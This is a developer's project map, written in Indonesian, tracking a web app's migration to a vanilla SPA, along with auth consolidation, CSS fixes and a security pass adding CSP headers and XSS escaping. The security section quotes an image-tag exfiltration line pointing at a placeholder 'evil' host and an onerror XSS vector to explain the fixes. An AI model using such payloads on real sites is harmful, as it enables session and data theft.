# MAP.md

Peta singkat repo ini, plus rencana pindah ke vanilla SPA. Tujuan file ini: siapapun (termasuk Claude sesi baru) bisa ngerti struktur app dalam beberapa menit, tanpa harus baca ribuan baris kode dulu.

Cara baca: bagian 1–2 itu potret KONDISI SEKARANG (apa adanya, termasuk bagian yang berantakan). Bagian 3–5 itu RENCANA. File ini SENGAJA dijaga tetap pendek — riwayat lengkap tiap sesi (apa yang dikerjain, bug apa yang ketemu, kenapa suatu keputusan diambil) dipindah ke `map-history.md` (24 Agustus 2026, biar file ini murah dibaca ulang tiap sesi baru — gak perlu re-paste ratusan baris changelog cuma buat orientasi).

**Baca juga:**
- `visi-pionir-workspaces.md` — keputusan arsitektur level lebih tinggi soal `index.html`/shell SPA.
- `design.md` — spec desain (warna, spacing, komponen shared nav) buat nyeragamin visual semua halaman. Shared nav (`app/pages/nav/`) sekarang WIRED IN (24 Agustus, sesi kelima belas) — `dashboard` halaman pertama yang beneran pakai. Route `home` DIPENSIUNKAN (26 Agustus, sesi keenam belas) — dengan sidebar persisten, halaman itu cuma nunjukin ulang daftar modul yang sama, jadi redundant; `DEFAULT_ROUTE` sekarang `dashboard`. 4 halaman lain (konversian/crud-produk/kompres-pdf/export-gambar) belum di-retrofit ke token warna/spacing design.md — mereka cuma jadi lebih sempit (sidebar makan 200px), BUKAN keganti warnanya (ada bug token-leak yang kejadian & difix sebelum ini live, lihat `map-history.md`). Konversian's top-bar sendiri udah dikurangin duplikasinya (Beranda/Stok/theme-toggle/Keluar disembunyikan lewat CSS, fungsinya pindah ke shared nav) — `crud-produk`'s sidebar internal MASIH dobel sama shared nav, belum disentuh (lihat `map-history.md` buat alasan kenapa ditunda).
- `map-history.md` — riwayat lengkap tiap sesi migrasi, urut tanggal. Baca ini kalau butuh tau KENAPA sesuatu dikerjain kayak sekarang, atau detail bug/fix spesifik. Bagian di bawah ini cuma nyimpen HASIL AKHIRNYA, bukan prosesnya.

---

## 1. Kondisi sekarang: 6 halaman, 6 cara load yang beda-beda

Setiap `.html` di root itu halaman terpisah, full page reload kalau pindah. Bukan SPA sama sekali sekarang.

Tabel ini soal file **LEGACY** (`.html` lama di root) — statusnya "masih ada di disk tapi gak dipakai router SPA", BUKAN status migrasi (itu ada di bagian 4 di bawah, sudah 6/6 ✅ per 26 Agustus). `crud-produk.html`/`stok.html`/`dashboard.html` sengaja belum dihapus meski versi SPA-nya udah selesai — lihat bagian 4.

| Halaman | JS-nya | Pakai shared/auth-session.js? | Auth-nya gimana |
|---|---|---|---|
| `konversian.html` | **DIHAPUS** — sudah jadi `app/pages/konversian/` di SPA, gak ada lagi standalone file (sesi keempat) | **Ya, penuh** — semua panggil `PNMAuth.*` | Satu-satunya yang udah bener |
| `crud-produk.html` | `crud-produk.js` (2920 baris) | Script-nya di-load, tapi **gak pernah dipanggil** | Auth manual sendiri (`checkWhitelistAndShowApp`, fetch langsung ke `/auth/v1/token`) — file LEGACY ini doang, versi SPA-nya (`app/pages/crud-produk/`) udah `PNMAuth.*` penuh |
| `stok.html` | inline `<script>` di dalam file itu sendiri | **Gak di-load sama sekali** | Auth manual sendiri, refresh token manual lewat `fetch()` — file LEGACY ini doang, versi SPA-nya (`app/pages/stok/`) udah `PNMAuth.*` penuh (sesi ketujuh belas) |
| `dashboard.html` | `dashboard.js` (1295 baris) | **Gak di-load sama sekali** | Auth manual sendiri, sama polanya kayak stok.html — file LEGACY ini doang, versi SPA-nya (`app/pages/dashboard/`) udah `PNMAuth.*` penuh |
| `export-gambar-gabungan.html` | **DIHAPUS** — sudah jadi `app/pages/export-gambar/` di SPA (sesi kesembilan) | — | — |
| `kompres-pdf.html` | **DIHAPUS** — sudah jadi `app/pages/kompres-pdf/` di SPA (sesi kesembilan) | — | — |

**Duplikasi yang masih tersisa** (di 3 file LEGACY `stok.html`/`dashboard.html`/`crud-produk.html` yang belum dihapus — BUKAN di versi SPA-nya masing-masing, yang udah dibereskan pas migrasi): `const SUPABASE_URL = '...'` di-declare ulang di file-file lama itu (masing-masing juga punya fungsi refresh-token sendiri-sendiri, mirip tapi gak identik). `shared/toast.js` nampung 2 skema class CSS beda (`.toast-success` vs `.toast.success`) dari 2 sistem lama yang disatuin belakangan tanpa diseragamin — `stok` (baik legacy maupun versi SPA) gak pernah pakai `PNMToast` sama sekali (dicek dulu sebelum migrasi sesi ketujuh belas, halaman ini pakai `#stok-status-msg`/`.result-banner` sendiri), jadi item toast ini gak relevan buat halaman itu. Konteks/alasan lengkap kenapa ini kejadian ada di `map-history.md` (bagian awal).

---

## 2. Isi konversian.js per bagian (buat nanti dipecah)

File ini yang paling gede (6998 baris), tapi sebenarnya sudah punya batas-batas section yang jelas lewat komentar `══════` di dalamnya. Ini daftarnya, urut dari atas:

1. Sesi login persistent + auth (baris ~30–250)
2. Realtime client setup (postgres_changes/presence/broadcast)
3. Resize panel clipboard (drag handle)
4. Collapse panel pencarian
5. Preferensi/settings
6. Status koneksi (online/offline banner)
7. Sesi konversi (clipboard sebagai objek tersimpan di server)
8. Dua pintu: Cari Cepat vs Konversi
9. Navigasi konversian.html ↔ crud-produk.html
10. Realtime kolaborasi (2 channel per sesi)
11. Tab clipboard: Kebutuhan RS vs Clipboard
12. Record konversi → Google Sheets (webhook)
13. Dual write ke Supabase
14. Modul Stok (di dalam konversian.js juga, bukan cuma di stok.html)
15. Modul Converter (paste kode+nama → cocokkan ke katalog)
16. Resolve manual buat baris yang gak ketemu
17. Pencarian exact-by-kode (disatukan, sudah ada cache)
18. Modul Permintaan RS
19. Kebutuhan RS (sidebar clipboard)
20. Saran Dictionary inline
21. Cari SET Mendekati (fuzzy match, skor Jaccard)
22. Dictionary istilah customer

Ini bukan file yang berantakan tanpa struktur — struktur logisnya udah ada, cuma belum dipisah jadi file fisik terpisah. Kerja "pisahin jadi modul" jadi jauh lebih gampang karena batasnya udah kelihatan.

---

## 3. Target struktur SPA

```
/app
  shell.html          <- satu file HTML kosong, cuma ada <div id="app"> + <script type="module" src="/app/router.js">
  router.js           <- ~40 baris, dengar hash/History API, import() modul halaman, panggil mount()
  state/
    store.js          <- pengganti PNMAuth + variabel global tersebar (stokAccessToken, currentUser, dst)
  pages/
    konversian/
      index.js         <- export mount(container)/unmount()
      search.js         <- section 8 (Cari Cepat) + 17 (exact-by-kode)
      clipboard.js       <- section 7, 11
      sph.js             <- isi sph-module.js, hampir gak berubah
      dictionary.js      <- section 20, 22
      set-mendekati.js   <- section 21
      permintaan-rs.js   <- section 18, 19
      realtime.js        <- section 2, 10
    crud-produk/
      index.js
    stok/
      index.js
    dashboard/
      index.js
    kompres-pdf/
      index.js           <- ini paling gampang, gak nyentuh Supabase sama sekali
    export-gambar/
      index.js
shared/                <- TETAP DI SINI, gak pindah — udah bagus posisinya
  supabase-client.js
  auth-session.js
  toast.js
```

Tetap zero-build. `<script type="module">` dan `import()` jalan native di browser, gak butuh bundler, gak butuh `npm install`. Alur "buka file, edit, refresh" tetap sama persis.

---

## 4. Urutan migrasi yang disaranin

Bukan urut abjad, tapi urut dari yang paling siap ke yang paling belum:

1. ✅ **`kompres-pdf.html`** — SELESAI (22 Agustus). `/app/pages/kompres-pdf/`. Halaman lama sudah dihapus (sesi kesembilan).
2. ✅ **`export-gambar-gabungan.html`** — SELESAI (22 Agustus). `/app/pages/export-gambar/`. Halaman lama sudah dihapus (sesi kesembilan).
3. ✅ **`konversian.html`** — SELESAI (22 Agustus). `/app/pages/konversian/`. Paling gede (9000+ baris), auth udah PNMAuth dari awal.
4. ✅ **`crud-produk.html`** — SELESAI (23 Agustus, sesi kesebelas). `/app/pages/crud-produk/`. Auth manual diganti ke PNMAuth + dibungkus SPA sekaligus. Halaman lama MASIH ADA (belum dihapus — belum ditest browser end-to-end, lihat `map-history.md` sesi kesebelas/kedua belas sebelum hapus).
5. ✅ **`dashboard.html`** — SELESAI (24 Agustus, sesi kelima belas). `/app/pages/dashboard/`. Halaman PERTAMA yang beneran pakai shared nav (`app/pages/nav/`, sekarang WIRED IN — lihat bagian 3 di bawah). Auth-nya paling beda sendiri (raw `fetch()` manual, bukan SDK) — full rewrite ke PNMAuth, bukan sekadar swap panggilan. 2 bug nyata ketemu & difix saat port (theme toggle yang gak pernah beneran ganti warna, detail-modal wiring yang gak akan jalan lagi di kunjungan ke-2+). Halaman lama MASIH ADA, belum ditest browser.
6. ✅ **`stok.html`** — SELESAI (26 Agustus, sesi ketujuh belas). `/app/pages/stok/`. Satu-satunya sisa yang tinggal — beda dari dashboard karena masih inline `<script>` (belum kepisah dari HTML-nya), jadi sesi ini juga ngerjain restrukturisasi itu sekaligus (`markup.js` dipisah dari script). Auth (raw `fetch()` manual, sama polanya kayak `dashboard.html` asli) diganti penuh ke `PNMAuth.*`. `const SUPABASE_URL`/`ANON_KEY` yang di-duplicate (item lama di bagian 1 tabel di atas) diganti `window.PNM_SUPABASE_URL`/`window.PNM_SUPABASE_ANON_KEY`. Dibangun langsung pakai `pw-topbar` (nav udah wired in duluan dari sesi dashboard) — toggle tema sendiri (`#theme-toggle-gate`/`#theme-toggle-app`) DIHAPUS TOTAL, shared nav satu-satunya pemilik theming, sama kayak `dashboard`. Gak ada `style.css` sendiri — semua class stok (`.dropzone`, `.stat-pill`, `.skip-panel`, `.activity-table`, dst) udah ada di `pnm-universal.css` (dicek class-per-class), sama situasinya kayak `dashboard`. Link internal `href="/stok.html"` di `konversian`'s top bar diganti `#stok`; `home/markup.js`'s `MODULES` entry `stok` diupdate `migrated: true` (walau route `home` sendiri retired/orphaned). Halaman lama (`stok.html`) MASIH ADA (belum dihapus — belum ditest browser end-to-end, sama kehati-hatian kayak `crud-produk`/`dashboard`).

Semua 6 halaman legacy sekarang punya versi SPA — DAN legacy `.html` files-nya SUDAH DIHAPUS (dikonfirmasi user 2 September 2026, lihat checklist bagian 5 di bawah + `map-history.md`). Migrasi struktural 100% kelar. Sisa kerja sekarang murni roadmap "setelah push": retrofit visual `design.md` steps 2-6 buat `konversian`/`crud-produk` (satu-satunya 2 modul yang belum, sekarang aman dikerjain karena nav redesign yang kena struktural di keduanya udah dikonfirmasi jalan di browser beneran), `css-audit.md`, breakup `konversian/index.js`, dan audit "async nulis DOM abis unmount" yang diflag sesi lanjutan.

**CSS race condition — RESOLVED (sesi kedelapan belas → kedua puluh dua, 26-28 Agustus):** `export-gambar`, `kompres-pdf`, `crud-produk` semua sempat punya bug CSS nyangkut ke modul lain pas pindah halaman — root cause: `style.css` masing-masing (bare selector `:root`/`body`/`h1`/`table` dst) gak pernah `remove()` di `unmount()`. **Ketiganya sudah difix** (`export-gambar` sesi kedelapan belas, sekalian ditulis ulang jadi NOL bare selector di sesi kedua puluh; `kompres-pdf`/`crud-produk` menyusul sesi kedua puluh dua, dikonfirmasi user via browser asli bahwa bug-nya beneran kejadian). `konversian`/`dashboard`/`stok` kebukti aman dari awal. **Kelas bug ini sekarang kelar buat semua 6 modul** — detail lengkap di `map-history.md` sesi kedelapan belas/kedua puluh dua.

**Auth gate juga sempat unstyled (sesi kedua puluh satu, 28 Agustus):** gate baru (sesi kedua puluh) muncul polos tanpa CSS — `shared/auth-gate.js` gak pernah nge-load `pnm-universal.css` sendiri (dulu gratis lewat halaman yang mount duluan, sekarang gate muncul sebelum halaman manapun mount). **Sudah difix** — `auth-gate.js` sekarang load CSS itu sendiri.

**`konversian` auth consolidation, akhirnya (sesi keamanan, 15 September 2026):** item yang ditunda sejak sesi kedua puluh (lihat catatan di atas) — `konversian` sekarang IKUT konsolidasi shared gate, sama seperti 4 modul lain. `markup.js`'s `#auth-gate`/`#gate-email`/`#gate-password`/`#gate-login-btn`/`#gate-status` DIHAPUS (`#app-root` gak lagi start `display:none`); `index.js`'s `checkWhitelist()` (query `allowed_users` KEDUA yang redundan tiap mount, dari jaman sebelum ada gate bersama) DIHAPUS TOTAL — `shared/auth-gate.js` udah ngecek whitelist itu untuk SEMUA modul sebelum routing bahkan dimulai. `showGate(msg)` (dipanggil `clipboard.js`/`permintaan-rs.js` pas `sesiFetch()` dapet 401) sekarang toast pesannya lalu `PNMAuth.logout()`, pola 401-handling yang sama kayak `dashboard`/`stok`. `onAuthStateChange` lokal cuma masih dengerin `TOKEN_REFRESHED`/`USER_UPDATED` — kasus logout/sesi-habis udah jadi tanggung jawab `shared/auth-gate.js` + `router.js`'s `onLoggedOut`. `#btn-logout` (tombol "Keluar" tersembunyi di `.konv-legacy-controls`) SENGAJA dibiarkan — dia sudah manggil `PNMAuth.logout()` yang sama dipakai nav sidebar, jadi bukan jalur auth kedua yang beda. **BELUM ditest di browser beneran** (sandbox ini gak ada akses browser/Supabase — sama keterbatasan yang sudah dicatat di breakup sesi kedua puluh tujuh) — smoke-test manual WAJIB sebelum deploy: login lewat gate bersama → buka `konversian` → pastikan langsung kepakai (gak nyangkut di layar kosong) → coba semua tab → logout dari sidebar sambil `konversian` lagi kebuka (pastikan ke-unmount bersih, gak ada error konsol) → biarin token expired (atau paksa 401 manual) buat verifikasi jalur `showGate()` yang baru.

**Security headers (sesi keamanan, 15 September 2026):** app ini gak pernah punya security header SAMA SEKALI — gak ada CSP, gak ada clickjacking/MIME-sniffing protection. Ditambahin ke `vercel.json` (prod) + `serve.json` (dev lokal, biar parity): CSP yang dibatasin cuma ke origin yang beneran dipakai (jsdelivr/unpkg/cdnjs buat vendor scripts, Supabase buat data+realtime — lihat daftar lengkap di file konfignya), `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy` yang matiin camera/mic/geolocation/dll yang emang gak dipakai, dan HSTS. `script-src` TETAP pakai `'unsafe-inline'` (app ini masih banyak `onclick="..."` inline — hash/nonce gak realistis buat diretrofit blind ke 11K+ baris tanpa browser) dan `'wasm-unsafe-eval'` (dikonfirmasi dibutuhin Tesseract.js buat OCR) TAPI SENGAJA gak pakai full `'unsafe-eval'` — kalau ExcelJS export ternyata butuh itu (ada risiko lewat dependency `fast-csv`-nya, belum dikonfirmasi kepake beneran di app ini), itu satu-satunya baris yang mungkin perlu ditambah balik, bukan default-on. `img-src` DIBATASIN ke `'self' data: blob:` + bucket Supabase storage doang (BUKAN `https:` bebas) — ini defense-in-depth langsung berhubungan sama temuan XSS di bawah: kalau ada `innerHTML` yang kelewat belum di-escape, `img-src` sempit ini nutup salah satu jalur exfiltrate data paling gampang (`<img src="https://evil/?d=...">`). **BELUM ditest di browser** — kalau ada fitur yang tiba-tiba silent-fail abis deploy (gambar gak muncul, script CDN ke-block, dst), cek console buat CSP violation report dulu sebelum nyari bug di tempat lain.

**XSS: `File.name`/spreadsheet-cell/DB-text-field yang gak di-escape (sesi keamanan, 15 September 2026):** ditemuin & difix beberapa titik stored/self-XSS nyata — pola yang sama di semua: user-controlled string (nama file lokal, isi cell Excel yang diupload, nama produk yang staff lain edit) dirender langsung ke `innerHTML` tanpa escaping, padahal string-string itu bisa berisi markup/script beneran (`<img src=x onerror=...>`). Karena sesi Supabase Auth app ini disimpen di cookie yang KEBACA JS (bukan httpOnly — lihat `shared/supabase-client.js`), ini bukan sekadar tampilan berantakan, tapi jalur nyolong sesi:
  - `kompres-pdf/index.js`: `item.file.name` (4 titik: list utama, hasil, split, merge) — file PDF yang mau dikompres/split/merge dipilih user dari disk, namanya bisa apa aja.
  - `export-gambar/index.js`: nama file dari Supabase Storage bucket `thumbnails` (2 titik: `renderFileList()`, `renderChips()`) + pesan `toast()` (bisa keisi teks yang diketik user, mis. kode yang gak ketemu). Ini malah LEBIH parah dari kompres-pdf — nama objek storage itu keliatan buat SEMUA staff yang buka halaman ini, bukan cuma yang upload.
  - `stok/index.js`: `kode_asli` dari cell Excel yang diupload user (tabel "kode dilewati"), `fileName` (nama file Excel yang diupload), dan kode-kode yang di-echo balik server pas ada yang "dilewati karena belum terdaftar".
  - `dashboard/index.js`: `nama_produk` (3 titik render tabel) — field teks bebas yang staff edit lewat `crud-produk`, jadi ini stored XSS yang bisa nyerang staff LAIN yang buka dashboard, bukan cuma diri sendiri. `dashboard/index.js` udah punya helper `escapeHtmlAttr()`/`escapeXml()` dari awal, cuma belum dipakai konsisten di 3 titik ini.
  Fix: tambah `escapeHtml()` lokal di file yang belum punya (`kompres-pdf`, `export-gambar`, `stok`), pakai yang udah ada (`escapeHtmlAttr`) di `dashboard`. **Audit ini TIDAK exhaustive** — app ini punya 300+ titik `innerHTML` total, yang diaudit cuma yang paling jelas berisiko (nama file, cell spreadsheet, field teks bebas yang staff edit). `crud-produk/index.js` sendiri kelihatannya udah paling rajin escape (82 pemakaian `escapeHtml`-style), gak diaudit ulang detail. Kalau ada waktu sesi depan: audit `konversian`'s split files lebih dalam (udah keliatan cukup rajin escape lewat `S.escapeHtmlAttr`, tapi belum di-cross-check semua 60+ titik satu-satu) dan cek `err.message`/respons server lain yang mungkin nge-echo input user.

**Auth consolidation + export-gambar visual rewrite (sesi kedua puluh, 27 Agustus):** Item "Auth consolidation (single shared gate)" yang tadinya di-plot buat SETELAH push pertama (lihat draft `tempel-ke-map-section-4.md`) di-overrule user, dikerjain sekarang. `shared/auth-gate.js` (baru) sekarang satu-satunya login gate, dipasang `router.js` sebelum modul manapun di-`mount()`. Per-page gate DIHAPUS dari `dashboard`/`stok`/`crud-produk`/`export-gambar`. `konversian` SENGAJA belum disentuh (masih pakai gate lokalnya sendiri) — file paling gede/delicate, ditunda ke sesi terpisah. `export-gambar` juga sekalian ditulis ulang visualnya (markup.js + style.css dari nol) buang tema dark-glass, reuse komponen `pnm-universal.css` kayak `dashboard`/`stok`. **Auth flow-nya sendiri (login → whitelist → logout → gate lagi → kombinasi pindah modul) masih belum ditest manual secara menyeluruh** — baru CSS-leak & gate-styling yang udah dikonfirmasi user via browser asli sejauh ini.

---

## 5. Checklist sebelum push ke main (per sesi kedua puluh dua)

- [x] CSS race condition semua 6 modul (lihat bagian 4 di atas).
- [x] Auth gate ke-style dengan benar.
- [x] **Test manual browser, alur auth penuh + nav redesign** — dikonfirmasi user langsung: "its deleted, i tested it and now working fine" (2 September 2026). Semua bug yang ketemu dari testing itu (initAuth dashboard, setSubroute konversian+crud-produk, lastQuery TDZ, vendor-script version mismatch, export-gambar stale-closure crash — lihat `map-history.md` sesi lanjutan buat detail lengkap tiap satu) udah difix dan dikonfirmasi jalan.
- [x] **`konversian` masih pakai gate lokalnya sendiri** — TIDAK LAGI: dikonsolidasikan ke shared gate sesi 15 September 2026 (lihat catatan di bagian 4). Semua 5 modul yang punya login sekarang satu gate, satu whitelist check. **Belum ditest browser** — lihat catatan konsolidasi di bagian 4 buat langkah smoke-test yang wajib sebelum deploy.
- [x] **Legacy `.html` files DIHAPUS** — dikonfirmasi lewat `tree /f` user: root sekarang cuma `index.html` (shell), gak ada lagi `crud-produk.html`/`dashboard.html`/`stok.html`/`konversian.html`/`kompres-pdf.html`/`export-gambar-gabungan.html`. Migrasi SPA 100% selesai secara struktural.
- [ ] (Roadmap terpisah, SETELAH push — bukan syarat push) retrofit visual `design.md` steps 2-6 buat sisa modul (`dashboard`+`stok` selesai sesi kedua puluh empat, `kompres-pdf` full-rewrite selesai sesi kedua puluh lima, `export-gambar` udah selesai dari sesi kesembilan belas — lihat `map-history.md`; tinggal `konversian`/`crud-produk` yang beneran belum tersentuh sama sekali VISUAL-nya — TAPI sekarang udah aman dikerjain, nav redesign yang kena struktural di keduanya udah dikonfirmasi jalan di browser), `css-audit.md`, breakup `konversian/index.js`, DAN audit "async operation nulis DOM abis unmount" yang diflag sesi lanjutan (ketemu 1 instance nyata di `export-gambar`, kemungkinan ada di modul lain juga, belum diaudit menyeluruh) — semua ini masih di urutan yang sama seperti draft `tempel-ke-map-section-4.md`, minus item yang udah selesai.

---

## 5. Checklist per halaman pas migrasi

Buat tiap halaman yang mau dipindah ke SPA, ini yang perlu dicek:

- [ ] Ganti auth manual (kalau masih ada) ke `PNMAuth.*`
- [ ] Bungkus kode setup jadi `mount(container)` + `unmount()`, bukan langsung jalan pas file di-load
- [ ] **Cek `const sb = window.pnmSupabase` (atau sejenisnya) TIDAK ada di module scope (di luar `mount()`)** — module di-`import()` router.js SEBELUM vendor scripts sempat jalan, jadi `window.pnmSupabase` masih `undefined` di titik itu. Harus di-assign DI DALAM `mount()`, setelah `await ensureVendorScripts()`. (Bug nyata yang kejadian di `crud-produk`, lihat `map-history.md` sesi kedua belas.)
- [ ] Pindahin `const SUPABASE_URL = ...` yang di-duplicate — pakai `window.PNM_SUPABASE_URL` dari shared client
- [ ] Cek toast — pastikan container yang dipakai sama-sama nyambung ke skema class yang sama di `shared/toast.js`
- [ ] Pastikan link internal ke halaman lain (`href="/stok.html"`) diganti ke route SPA setelah halaman tujuannya juga udah dimigrasi
- [ ] `pnm-universal.css` (kalau halaman ini butuh): load di `mount()`, `remove()` di `unmount()` — jangan "shared selamanya" (lihat `map-history.md` sesi kesembilan)
- [ ] CSS/font stylesheet: `ensureStyle()` harus balikin Promise yang di-`await` SEBELUM `container.innerHTML` di-set, biar gak ada flash unstyled (lihat `map-history.md` sesi kesepuluh)

---

## 6. Retrofit visual `design.md` — konversian & crud-produk (mulai sesi kedua puluh tiga)

Item pertama dari roadmap "setelah push" (bagian 5). Status per konversian & crud-produk terhadap 6 langkah checklist `design.md` bagian "Migration checklist per module":

1. ✅ Layout sidebar+topbar — sudah (nav wired in dari sesi-sesi sebelumnya).
2. 🟡 **SEBAGIAN** — kedua modul sudah pakai token warna (`var(--text)`, `var(--border)`, dst) dari `pnm-universal.css`, BUKAN hex hardcode per-modul (jadi bukan anti-pattern "1 warna per modul" yang paling parah). TAPI banyak komponen masih pakai `box-shadow` dekoratif (kartu, dropdown, modal, toast, toggle knob) dan hover yang ganti warna border ke `--accent` + `translateY(-3px)` — keduanya dilarang `design.md` ("No shadows... flat surfaces + hairline borders only", hover cuma `border-strong` + `translateY(-1px)` max). **Sesi ini SUDAH beresin bagian ini** — semua `box-shadow` dekoratif (bukan focus-ring) di section KONVERSIAN dan CRUD PRODUK di `pnm-universal.css` dihapus/diganti border, `.prod-card`/`.rcard`/`.auth-gate-box` (versi konversian doang, BUKAN punya dashboard/stok yang identik teksnya — sengaja gak disentuh, di luar scope sesi ini) hover-nya diganti ke pola `design.md`. Focus-ring `box-shadow` (`#search-input:focus`, `.conv-manual-input:focus`, keyframe `rt-field-pulse`) SENGAJA DIBIARKAN — itu bukan depth-shadow, itu aksesibilitas.
3. ✅ Icon library — ternyata SUDAH pakai Tabler icons webfont (`@tabler/icons-webfont`, di-load `crud-produk/index.js`) dari awal, gak perlu kerjaan tambahan buat langkah ini.
4. ❌ **BELUM** — status masih pakai pill berwarna solid (`.seal-*`, `.status-pill.*`, `.filter-chip.active` varian warna, `.log-action.*`, `.row-status.*`, `.adv-filter-chip`), BUKAN pola titik+label yang disaranin `design.md`. Ini kerjaan PALING BESAR yang tersisa — beda dari item shadow di atas, ini BUKAN cuma ganti CSS, karena markup badge-nya di-generate dari JS (render function di `crud-produk/index.js`/`konversian/index.js`, ribuan baris, belum diaudit satu-satu titik generate-nya). Belum disentuh sesi ini — butuh sesi terpisah yang masuk ke index.js, dan WAJIB ditest browser beneran sebelum dianggap selesai (bukan cuma CSS-only kayak item 2 di atas).
5. ❌ **BELUM diaudit** — spacing di kedua modul ini (dan sebenarnya di SEMUA modul, termasuk yang udah "selesai" kayak dashboard/stok) masih campur px ad hoc (`10px`,`14px`,`18px`,`22px`,`6px`) yang gak persis di skala 8pt `design.md`. Ini utang lama yang pre-existing di semua modul, bukan spesifik konversian/crud-produk — normalisasi penuh ke skala 8pt beresiko tinggi (banyak layout dense yang udah di-tuning manual), BELUM disaranin dikerjain borongan tanpa test browser per komponen. Diturunin prioritasnya dari 4 item lain.
6. ✅ Angka pakai `var(--font-mono)` — sudah, dicek: kode/harga/qty/tanggal (`pc-kode`,`sl-kode`,`cr-kode`,`cr-qty`,`ar-no`,`log-table`, dst) semua udah mono. Gak ada kerjaan tambahan buat langkah ini.

**Ringkasan sesi ini**: langkah 2 (shadow/hover) beres, langkah 3 & 6 ternyata sudah beres dari sebelumnya (gak disadari map.md versi lama). Langkah 4 (status pill → dot+label) adalah item terbesar yang tersisa, langkah 5 (spacing 8pt) didowngrade prioritas. **Semua perubahan sesi ini CSS-only, BELUM ditest browser beneran** — ikuti kehati-hatian yang sama kayak sesi-sesi migrasi sebelumnya (lihat pola di bagian 4/5 map.md), jangan anggap "selesai" sebelum dikonfirmasi user lewat browser asli. Detail lengkap tiap file/baris yang diubah ada di `map-history.md`.

---

## 7. Audit konsistensi visual shell (mulai sesi kedua puluh empat)

User kasih 5 screenshot + audit brief lengkap (P0/P1/P2), minta audit-dulu-baru-fix, scope-nya BUKAN retrofit design.md lanjutan (item bagian 6) — ini murni "shell polish": breadcrumb, duplikasi kontrol, dan satu bug nyata di nav search. Temuan + fix (detail lengkap di `map-history.md`):

1. **Bug nav search "cascading text"** (dilaporkan user, root cause gak kepastian 100% tanpa browser) — `.pw-nav-search-results` (dropdown) overlap posisinya PERSIS di atas `.pw-nav-eyebrow`+`.pw-nav-list` (module list sidebar). Fix defensif: list disembunyikan (`visibility:hidden`, bukan `display:none` biar gak reflow) selama dropdown search terbuka (class `.pw-nav--searching` di-toggle dari `nav.js`), plus dropdown-nya sendiri dikasih fallback background + `isolation:isolate` biar gak gantung ke resolusi custom-property yang gak pasti. **BELUM diverifikasi browser** — ini fix yang nutup SEMUA kemungkinan root cause yang kepikiran (stacking context, token leak, dll), bukan fix yang sudah dikonfirmasi tepat sasaran.
2. **Breadcrumb "Workspaces / X" redundan** (user tanya soal stok doang, tapi pola yang SAMA PERSIS dipakai 4 halaman) — dihapus prefix-nya di stok, dashboard, kompres-pdf, export-gambar (SEMUA yang pakai `.pw-topbar-crumb`, bukan cuma stok — biar gak bikin inkonsistensi baru), plus helper `topbarMarkup()` di `nav-markup.js` (belum ada pemanggilnya sekarang, tapi disamain juga buat halaman baru nanti).
3. **CRUD Produk masih ada theme-toggle sendiri** (`#themeToggle`, duplikat sama punya sidebar global) — dicek, ini persis bug class yang UDAH dibenerin di `stok` sesi sebelumnya (`#theme-toggle-gate`/`#theme-toggle-app` dihapus di sana), cuma kelewat di crud-produk. Dihapus markup + JS wiring-nya (`themeToggle`/`themeIcon`/`applyTheme` di index.js) — dicek dulu localStorage key (`theme`) & attribute (`html[data-theme]`) yang dipakai toggle sidebar SAMA PERSIS sama yang halaman ini baca, jadi aman dihapus tanpa ganti apa pun lagi.

**SENGAJA GAK disentuh** (didokumentasikan, bukan lupa):
- Konversian PUNYA bug yang sama (`#theme-toggle` duplikat) TAPI tombolnya di-`.click()`-simulasikan dari fitur lain di file yang sama (panel preferensi) — bukan penghapusan bersih kayak crud-produk, butuh audit terpisah biar gak break fitur itu.
- Crud-produk masih BELUM punya `.pw-topbar` breadcrumb sama sekali (topbar-nya sendiri, bukan yang shared) — gap struktural asli, tapi masukin `.pw-topbar` ke sana berarti dua topbar numpuk kalau gak dirapiin dulu, di luar scope "polish" sesi ini.
- kompres-pdf's hero header (eyebrow+h1+sub) dan layout tool-standalone-nya — SENGAJA, itu udah full rewrite design.md yang di-browser-test sesi lain, cuma breadcrumb-nya yang disamain sesi ini.
- Shadow yang tersisa di `.card`/`.auth-gate-box` stok — eksplisit di luar scope (user bilang jangan redo retrofit stok).
- Icon library beda (Phosphor `ph-*` di stok/dashboard/konversian vs Tabler `ti-*` di nav/crud-produk) dan beda 8px top-padding dashboard-vs-stok — didiamkan, resiko/effort gak sepadan buat polish pass ini.

**Verifikasi**: `node --check` (ESM strict, `.mjs`) di SEMUA 8 file yang disentuh (`nav.js`, `nav-markup.js`, `crud-produk/index.js`, `crud-produk/markup.js`, `stok/markup.js`, `dashboard/markup.js`, `kompres-pdf/markup.js`, `export-gambar/markup.js`) — semua lolos. **BELUM ada browser testing** — khususnya fix nav-search (item 1) belum dikonfirmasi beneran nutup bug yang dilaporin, karena root cause pastinya gak bisa dipastikan dari inspeksi kode doang.

---

## 8. Follow-up sesi 25 — search dark-mode masih bug, subtab konversian redundan, kompres-pdf "kayak patch job"

User browser-test hasil sesi 24, kasih temuan baru:

1. **Search dropdown masih ada masalah di dark mode** — fix sesi 24 (CSS class `.pw-nav--searching`) diganti total ke `style.visibility` LANGSUNG dari JS (`setSearchOverlayState()` di `nav.js`), bukan lewat class lagi — nutup semua kemungkinan cascade/specificity yang gak bisa diverifikasi tanpa browser. **Masih belum dikonfirmasi browser** — kalau MASIH bug lagi setelah ini, root cause-nya BUKAN cascade (udah dipastikan gak mungkin lewat inline style), berarti sesuatu yang lain — perlu screenshot devtools/inspect-element session buat mastiin, gak bisa lagi diselesaikan cuma dari baca kode.
2. **Subtab horizontal konversian dihapus dari TAMPILAN** (bukan dari DOM — `switchSubTab()` di index.js manggil elemen-elemen itu tanpa null-check, hapus dari markup bakal crash halaman). `.subtab-btn{display:none}` di `pnm-universal.css`. **Trade-off**: badge count (jumlah item clipboard konversi) yang nempel di tombol-tombol itu SEKARANG GAK KELIATAN DI MANA PUN — belum di-port ke sidebar (5 titik update tersebar di index.js, resiko lebih tinggi dari yang cocok buat sesi tanpa browser). Kalau user mau badge itu balik, itu kerjaan terpisah.
3. **Kompres PDF's token warna sendiri (`--bg`/`--accent`/dst di `.kp-page`) SELAMA INI make angka SPEK design.md persis (`#0070F3`), BUKAN angka yang BENERAN dipakai `pnm-universal.css` (`#007AFF`)** — mirip tapi beda, itulah sumber "kerasa patch job"-nya. Diganti ke angka pnm-universal.css yang asli, nama variabel kompres-pdf sendiri (--ink dst) gak diubah. Sekalian ketemu bug kecil: dot-status warna (`--success-dot` dst) gak pernah punya varian dark mode, sekarang udah ditambahin.

